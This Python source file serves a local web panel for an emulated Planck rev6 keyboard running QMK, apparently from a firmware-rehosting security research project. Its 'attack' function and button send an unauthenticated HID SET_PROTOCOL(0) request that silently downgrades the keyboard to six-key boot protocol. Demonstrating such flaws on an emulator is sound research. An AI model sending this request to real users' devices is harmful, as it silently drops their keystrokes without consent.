# Copyright 2026 Christopher Wright
# SPDX-License-Identifier: AGPL-3.0-or-later
"""A polling web panel for the rehosted Planck rev6.

POLLING, NEVER SSE (playbook trap 5). Cloudflare and most proxies buffer
``text/event-stream``, so an ``EventSource`` panel is a permanently blank page
when it is not on localhost while working perfectly when it is. This serves
``GET /state`` as JSON and the page polls it every 1.5 s.

IT REAPS ITS CHILD (playbook traps 156 / 169 / 211). ``serve_forever()`` is
interrupted by ``KeyboardInterrupt`` but **not** by ``SIGTERM``, which is how a
supervisor, a test harness or a closing terminal actually stops a panel -- so a
bare ``except KeyboardInterrupt`` skips the teardown, orphans an emulator that
keeps holding the USB bridge port, and the *next* run then silently grades the
orphan. Teardown is in a ``finally``, with explicit SIGTERM/SIGINT/SIGHUP
handlers and an ``atexit`` backstop, and the HTTP server binds loopback only.
"""
from __future__ import annotations

import argparse
import atexit
import html
import json
import os
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Dict, List, Optional

from . import facts, paths, spawn

_LOCK = threading.RLock()
_PROC: Optional[subprocess.Popen] = None
_SOCK: Optional[socket.socket] = None
_BUF = b""
_NONCE = ""
_LOG = os.environ.get("HAL_PLANCK_LOG_DIR", ".") + "/planck-panel.log"

_STATE: Dict = {
    "running": False, "pid": None, "greeting": "", "identity": "not connected",
    "descriptors": {}, "descriptor_match": None, "console": "",
    "protocol": None, "protocol_history": [], "held": [], "matrix": "",
    "events": [], "verdict": "idle",
}


def _event(text: str) -> None:
    with _LOCK:
        _STATE["events"].append("%s  %s" % (time.strftime("%H:%M:%S"), text))
        _STATE["events"] = _STATE["events"][-40:]


# ---------------------------------------------------------------------------
def _shutdown() -> None:
    global _PROC, _SOCK
    with _LOCK:
        if _SOCK is not None:
            try:
                _SOCK.close()
            except OSError:
                pass
            _SOCK = None
        proc, _PROC = _PROC, None
        _STATE["running"] = False
    if proc is not None and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(10)
        except Exception:                      # noqa: BLE001
            proc.kill()


atexit.register(_shutdown)


def _readline(timeout: float = 30.0) -> str:
    global _BUF
    deadline = time.time() + timeout
    while b"\n" not in _BUF:
        if time.time() > deadline:
            raise TimeoutError("bridge read timed out")
        chunk = _SOCK.recv(65536)
        if not chunk:
            raise ConnectionError("the bridge closed")
        _BUF += chunk
    line, _BUF = _BUF.split(b"\n", 1)
    return line.decode("ascii", "replace").strip()


def _cmd(text: str) -> str:
    with _LOCK:
        if _SOCK is None:
            return "ERR not connected"
        _SOCK.sendall((text + "\n").encode())
        return _readline()


# ---------------------------------------------------------------------------
def do_boot() -> str:
    global _PROC, _SOCK, _BUF, _NONCE
    with _LOCK:
        if _PROC is not None and _PROC.poll() is None:
            return "already running"
    # Pre-flight by BIND, on both addresses, without SO_REUSEADDR -- the same
    # guard the attack uses, for the same reason.
    for host in ("0.0.0.0", "127.0.0.1"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((host, spawn.BRIDGE_PORT))
        except OSError as exc:
            return ("refusing to boot: tcp/%d is held on %s (%s)"
                    % (spawn.BRIDGE_PORT, host, exc))
        finally:
            s.close()

    _NONCE = spawn.new_nonce()
    env = spawn.spawn_env(nonce=_NONCE)
    os.makedirs(os.path.dirname(_LOG) or ".", exist_ok=True)
    fh = open(_LOG, "w")
    proc = subprocess.Popen(spawn.spawn_argv(), cwd=spawn.spawn_cwd(),
                            env=env, stdout=fh, stderr=subprocess.STDOUT)
    with _LOCK:
        _PROC = proc
        _STATE["running"] = True
        _STATE["pid"] = proc.pid
    _event("booted the firmware (pid %d); log: %s" % (proc.pid, _LOG))

    def connect():
        global _SOCK, _BUF
        deadline = time.time() + 240
        while time.time() < deadline:
            try:
                sk = socket.create_connection(("127.0.0.1", spawn.BRIDGE_PORT),
                                              timeout=5.0)
                sk.settimeout(60.0)
                with _LOCK:
                    _SOCK, _BUF = sk, b""
                greeting = _readline()
                with _LOCK:
                    _STATE["greeting"] = greeting
                ok = ("pid=%d" % proc.pid in greeting
                      and "nonce=%s" % _NONCE in greeting)
                with _LOCK:
                    _STATE["identity"] = (
                        "VERIFIED: this run's child pid AND this run's nonce"
                        if ok else
                        "REFUSED: the peer is not this run's emulator")
                _event("bridge connected; identity %s"
                       % ("verified" if ok else "REFUSED"))
                if not ok:
                    _shutdown()
                return
            except OSError:
                time.sleep(0.5)
        _event("never connected to the bridge")

    threading.Thread(target=connect, daemon=True).start()
    return "booting"


def do_enumerate() -> str:
    names = ["device", "config", "report0", "report1", "report2",
             "string1", "string2"]
    got, mismatch = {}, []
    for n in names:
        reply = _cmd("DESC %s" % n)
        if not reply.startswith("DESC "):
            return "the firmware has not transmitted %s yet (%s)" % (n, reply)
        body = bytes.fromhex(reply.split()[2])
        got[n] = body.hex()
        if body != facts.descriptor(n):
            mismatch.append(n)
    console = _cmd("CONSOLE")
    text = ""
    if console.startswith("CONSOLE ") and len(console) > 8:
        try:
            text = bytes.fromhex(console.split()[1]).decode("ascii", "replace")
        except ValueError:
            text = ""
    with _LOCK:
        _STATE["descriptors"] = got
        _STATE["descriptor_match"] = not mismatch
        _STATE["console"] = text
    _event("read %d descriptors off the wire; %s"
           % (len(got), "ALL MATCH the pre-boot prediction" if not mismatch
              else "MISMATCH in " + ", ".join(mismatch)))
    return "ok"


def _get_protocol() -> Optional[int]:
    reply = _cmd("CTRL 0xA1 0x03 0x0000 0x0000 1")
    if reply.startswith("CTRL-OK") and len(reply.split()) > 1:
        return bytes.fromhex(reply.split()[1])[0]
    return None


def do_read_protocol() -> str:
    p = _get_protocol()
    with _LOCK:
        _STATE["protocol"] = p
        _STATE["protocol_history"].append(
            "%s  GET_PROTOCOL -> 0x%02X" % (time.strftime("%H:%M:%S"), p)
            if p is not None else "GET_PROTOCOL failed")
    _event("GET_PROTOCOL -> %s"
           % ("0x%02X (%s)" % (p, "report / NKRO" if p else "BOOT / 6KRO")
              if p is not None else "no answer"))
    return "ok"


def do_attack() -> str:
    before = _get_protocol()
    _cmd("CTRL 0x21 0x0B 0x0000 0x0000 0")
    after = _get_protocol()
    with _LOCK:
        _STATE["protocol"] = after
        _STATE["protocol_history"].append(
            "%s  SET_PROTOCOL(0) -> interface 0" % time.strftime("%H:%M:%S"))
    if before == 1 and after == 0:
        verdict = ("LANDED -- the firmware's own GET_PROTOCOL now answers 0x00. "
                   "The keyboard was in report protocol (NKRO, 240-key bitmap) "
                   "and is now in BOOT protocol (six keys maximum). Nothing "
                   "authenticated the request and nothing tells the user.")
    else:
        verdict = ("did NOT land: the firmware answered 0x%02X before and "
                   "0x%02X after" % (before or 0xFF, after or 0xFF))
    with _LOCK:
        _STATE["verdict"] = verdict
    _event(verdict.split(" -- ")[0])
    return "ok"


def do_key(row: int, col: int, press: bool) -> str:
    _cmd("%s %d %d" % ("PRESS" if press else "RELEASE", row, col))
    reply = _cmd("MATRIX")
    with _LOCK:
        _STATE["matrix"] = reply
        _STATE["held"] = [p for p in reply.split("held=")[-1].split(";") if p]
    _event("%s matrix key (row %d, col %d)"
           % ("held" if press else "released", row, col))
    return "ok"


def do_refresh() -> str:
    with _LOCK:
        if _SOCK is None:
            return "not connected"
    reply = _cmd("MATRIX")
    console = _cmd("CONSOLE")
    text = ""
    if console.startswith("CONSOLE ") and len(console) > 8:
        try:
            text = bytes.fromhex(console.split()[1]).decode("ascii", "replace")
        except ValueError:
            text = ""
    with _LOCK:
        _STATE["matrix"] = reply
        _STATE["console"] = text
    return "ok"


# ---------------------------------------------------------------------------
PAGE = """<!-- served by rehostry_planck.planck_panel -->
<style>
 body{font:14px/1.5 -apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:18px;
      background:#12141a;color:#e8ecf1}
 h1{font-size:19px;margin:0 0 10px}
 .brief{background:#1b1f28;border:1px solid #2c3240;border-radius:8px;padding:10px 14px;
        margin-bottom:16px;max-width:1100px}
 .brief b{color:#8fd3ff}
 .brief div{margin:6px 0}
 button{font:13px inherit;padding:7px 12px;margin:0 6px 8px 0;border-radius:6px;
        border:1px solid #39415280;background:#232936;color:#e8ecf1;cursor:pointer}
 button:hover{background:#2c3444}
 button.attack{background:#5e1620;border-color:#a03040;color:#ffd7dc}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(330px,1fr));gap:14px;
       max-width:1400px}
 .card{background:#1b1f28;border:1px solid #2c3240;border-radius:8px;padding:10px 14px}
 .card h2{font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:#8b93a4;
          margin:0 0 8px}
 pre{white-space:pre-wrap;word-break:break-all;margin:0;font:12px/1.45 ui-monospace,
     SFMono-Regular,Menlo,monospace;color:#cfe3ff}
 .ok{color:#7ee787} .bad{color:#ff8a8a} .warn{color:#ffd479}
 .verdict{font-size:14px;padding:10px;border-radius:6px;background:#101820;
          border:1px solid #2c3240}
</style>
<h1>Planck rev6 (STM32F303, QMK on ChibiOS) &mdash; rehosted</h1>
<details class="brief" open>
 <summary>What this is</summary>
 <div><b>Device.</b> An OLKB/Drop <b>Planck rev6</b>: a 48-key 40&nbsp;% ortholinear
  keyboard built on an STM32F303 (&ldquo;Proton-C&rdquo;) running QMK on ChibiOS.
  Its only externally reachable surface is the USB cable, and on that cable it is
  the passive end &mdash; everything below is driven by a modelled USB host.</div>
 <div><b>Steps.</b> 1) <b>Boot firmware</b> &rarr; wait for &ldquo;bridge
  connected&rdquo; &rarr; 2) <b>Read descriptors</b> &rarr; 3) <b>Read protocol</b>
  &rarr; 4) <b>Downgrade to boot protocol (attack)</b> &rarr; 5) <b>Read
  protocol</b> again. <b>Hold key (0,0)</b> at any time to drive the switch
  matrix.</div>
 <div><b>What you&rsquo;re seeing.</b> <i>Identity</i> is whether the bridge on the
  other end proved it is this run&rsquo;s own emulator (its pid <i>and</i> a nonce
  generated for this spawn). <i>Descriptors</i> are bytes the <b>firmware</b>
  transmitted on endpoint&nbsp;0, compared against the bytes predicted from the
  image before it was ever booted. <i>Console</i> is what the firmware printed on
  its own QMK console HID endpoint. <i>Matrix</i> counters come from the
  firmware&rsquo;s own scan of the GPIO switch matrix.</div>
 <div><b>The attack.</b> The red button sends one <code>SET_PROTOCOL(0)</code>
  &mdash; an ordinary HID class request that <em>any</em> host the keyboard is
  plugged into may send, with no pairing, no confirmation and no indication to the
  user. It switches the keyboard out of report protocol (n-key rollover, a 240-key
  bitmap) into <b>boot protocol</b>, which carries at most <b>six</b> simultaneous
  keys. Everything typed beyond six is then dropped, silently and persistently.</div>
 <div><b>Expect.</b> Before: <code>GET_PROTOCOL &rarr; 0x01</code>. After:
  <code>0x00</code>, answered by the firmware itself. A device that ignored the
  request &mdash; or a patched one that required authorisation &mdash; would keep
  answering <code>0x01</code>, and the verdict line would say it did not land.</div>
</details>
<div>
 <button onclick="go('boot')">Boot firmware</button>
 <button onclick="go('enumerate')">Read descriptors</button>
 <button onclick="go('protocol')">Read protocol</button>
 <button onclick="go('key?row=0&amp;col=0&amp;press=1')">Hold key (0,0)</button>
 <button onclick="go('key?row=0&amp;col=0&amp;press=0')">Release key (0,0)</button>
 <button class="attack" onclick="go('attack')">Downgrade to boot protocol (attack)</button>
 <button onclick="go('stop')">Stop</button>
</div>
<div class="grid">
 <div class="card"><h2>State</h2><pre id="s"></pre></div>
 <div class="card"><h2>Verdict</h2><div class="verdict"><pre id="v"></pre></div></div>
 <div class="card"><h2>Firmware console (EP 0x83)</h2><pre id="c"></pre></div>
 <div class="card"><h2>Protocol round trips</h2><pre id="p"></pre></div>
 <div class="card"><h2>Descriptors the firmware transmitted</h2><pre id="d"></pre></div>
 <div class="card"><h2>Events</h2><pre id="e"></pre></div>
</div>
<script>
function go(p){fetch('/'+p).then(poll)}
function poll(){fetch('/state').then(r=>r.json()).then(j=>{
  document.getElementById('s').textContent =
    'running: '+j.running+'   pid: '+j.pid+
    '\\nidentity: '+j.identity+
    '\\ngreeting: '+j.greeting+
    '\\nprotocol: '+(j.protocol===null?'-':'0x'+j.protocol.toString(16).padStart(2,'0'))+
    '\\nmatrix:   '+j.matrix+
    '\\ndescriptors match prediction: '+j.descriptor_match;
  document.getElementById('v').textContent = j.verdict;
  document.getElementById('c').textContent = j.console || '(nothing yet)';
  document.getElementById('p').textContent = j.protocol_history.join('\\n');
  document.getElementById('d').textContent =
    Object.entries(j.descriptors).map(([k,v])=>k+': '+v).join('\\n\\n');
  document.getElementById('e').textContent = j.events.slice().reverse().join('\\n');
})}
poll(); setInterval(poll, 1500);
</script>
"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):        # noqa: ANN001 - quiet
        pass

    def _send(self, body: bytes, ctype: str) -> None:
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):             # noqa: N802
        path = self.path.split("?")[0]
        query = {}
        if "?" in self.path:
            for kv in self.path.split("?", 1)[1].split("&"):
                k, _, v = kv.partition("=")
                query[k] = v
        try:
            if path == "/":
                self._send(PAGE.encode(), "text/html; charset=utf-8")
                return
            if path == "/state":
                do_refresh()
                with _LOCK:
                    body = json.dumps(_STATE).encode()
                self._send(body, "application/json")
                return
            if path == "/boot":
                msg = do_boot()
            elif path == "/enumerate":
                msg = do_enumerate()
            elif path == "/protocol":
                msg = do_read_protocol()
            elif path == "/attack":
                msg = do_attack()
            elif path == "/key":
                msg = do_key(int(query.get("row", 0)), int(query.get("col", 0)),
                             query.get("press") == "1")
            elif path == "/stop":
                _shutdown()
                _event("stopped")
                msg = "stopped"
            else:
                msg = "unknown"
            self._send(json.dumps({"ok": msg}).encode(), "application/json")
        except Exception as exc:              # noqa: BLE001 - report, not 500
            _event("error: %s" % exc)
            self._send(json.dumps({"error": str(exc)}).encode(),
                       "application/json")


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Web panel for the rehosted "
                                             "Planck rev6.")
    ap.add_argument("--http-port", type=int, default=8892)
    args = ap.parse_args(argv)

    srv = ThreadingHTTPServer(("127.0.0.1", args.http_port), Handler)

    def bail(signum, frame):      # noqa: ANN001
        raise KeyboardInterrupt

    for sig in (signal.SIGTERM, signal.SIGINT, signal.SIGHUP):
        try:
            signal.signal(sig, bail)
        except (ValueError, OSError):
            pass

    print("rehostry-planck panel on http://127.0.0.1:%d" % args.http_port)
    print("  USB bridge port tcp/%d; emulator log %s"
          % (spawn.BRIDGE_PORT, _LOG))
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        # NOT in an `except KeyboardInterrupt` alone: SIGTERM would skip it and
        # orphan an emulator still holding the bridge port, which the NEXT run
        # would then silently talk to (playbook traps 156 / 169 / 211).
        _shutdown()
        srv.server_close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
